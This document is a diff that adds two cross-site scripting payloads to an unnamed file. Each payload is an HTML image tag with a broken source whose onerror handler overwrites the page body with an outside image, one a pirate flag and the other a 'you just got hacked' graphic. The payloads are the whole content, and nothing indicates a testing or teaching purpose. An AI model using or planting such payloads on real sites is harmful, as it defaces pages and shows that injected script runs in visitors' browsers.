@@ -1,0 +1,4 @@
+<img src='x' onerror="document.getElementsByTagName('body')[0].innerHTML = &quot;<img src='https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Pirate_Flag.svg/750px-Pirate_Flag.svg.png'/>&quot;;" /> 
+
+
+<img src='x' onerror="document.getElementsByTagName('body')[0].innerHTML = &quot;<img src='https://keepcalms.com/i/download/600/700/panic-lots-you-just-got-hacked.png'/>&quot;;" /> 
